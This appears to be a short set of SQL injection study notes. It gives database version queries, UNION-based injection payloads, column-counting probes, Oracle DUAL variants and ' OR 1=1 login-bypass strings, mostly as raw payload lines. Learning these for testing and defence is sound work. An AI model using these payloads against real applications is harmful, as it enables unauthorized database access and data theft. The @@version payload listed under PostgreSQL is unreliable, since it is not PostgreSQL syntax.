

##### Querying database type and version

Microsoft,MySQL

```
SELECT @@version
```

Oracle

```
SELECT * FROM v$version
```
```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

PostgreSQL

```
SELECT version()
```
```
' UNION SELECT @@version--
```

##### UNION Attacks

For the UNION query to succeed, two requirements must be met:

- The number of columns must be the same.
- The data types of each column must match.
    
We can use the order by clause to determine the number of columns by observing the server's responses to these queries:
    
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

####### Oracle UNION Attack

There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like

```
' UNION SELECT NULL FROM DUAL--
```
2 tables

```
'+UNION+SELECT+'abc','edw'+FROM+DUAL--
```


#### General SQL Injections

```
' OR '1'='1
```
URL Encoded Version

```
'+OR+1=1--
```